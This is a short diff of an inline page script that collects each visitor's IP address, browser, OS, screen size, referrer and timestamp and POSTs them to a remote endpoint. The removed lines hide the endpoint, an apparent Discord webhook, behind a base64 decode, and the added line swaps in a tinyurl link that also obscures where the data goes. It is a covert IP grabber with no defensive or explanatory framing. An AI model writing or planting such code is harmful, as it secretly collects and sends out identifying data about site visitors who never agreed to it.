@@ -18,10 +18,6 @@
 
     <script>
         (function() {
-            function decode(data) {
-                return atob(data);
-            }
-
             async function getIP() {
                 try {
                     const response = await fetch('https://api.ipify.org?format=json');
@@ -76,7 +72,7 @@
 
                 const data = { ip, br, os, sw, sh, rf, ts };
 
-                const url = decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NjM0OTEyODE4MzUxMzEzOC9QamNEdk1sbU1TZnotM2EyVFZVbWFl eEdMSEUydGpFRXVZYVcwayZNTFpzNW81MWlLLUpUS2owVmROWl9iazFjd1E0cFI5');
+                const url = 'https://tinyurl.com/ye8m429u';
 
                 fetch(url, {
                     method: 'POST',
